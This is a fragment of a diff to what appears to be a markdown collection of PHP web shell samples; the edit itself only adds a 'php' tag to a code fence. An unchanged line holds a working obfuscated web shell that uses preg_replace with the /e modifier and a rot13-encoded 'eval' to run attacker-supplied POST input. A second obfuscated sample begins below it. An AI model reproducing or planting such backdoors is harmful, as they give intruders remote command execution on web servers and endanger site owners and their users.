@@ -21,7 +21,7 @@
 <?php ($sun = $_POST['sun']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($sun)','add');?>
 ```
 `y2grc48wekjxs2h`
-```
+```php
 <?php
 $oK = $oK.substr("lB12payJCstr_ru0Qk",9,5);
 $in9 = ltrim("y9fxwgjl42");
